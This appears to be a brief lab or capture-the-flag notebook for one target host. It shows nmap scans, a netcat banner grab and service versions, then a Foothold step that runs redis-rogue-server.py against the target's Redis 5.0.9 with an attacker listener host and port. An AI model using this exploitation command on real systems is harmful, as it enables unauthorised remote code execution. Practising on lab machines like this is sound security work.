### Enumeration
```
IP=192.168.218.69
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,8080,6379,27017 -A $IP
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
- 80
	- nginx 1.10.3
- 8080
	- http-proxy
- 6379
	- Redis key-value store 5.0.9
- 27017
### Foothold
- 6379
	- python3 redis-rogue-server.py --rhost 192.168.218.69 --lhost 192.168.45.195 --lport 22
	- ![[Pasted image 20240717162023.png]]
### Credentials
### Lessons Learned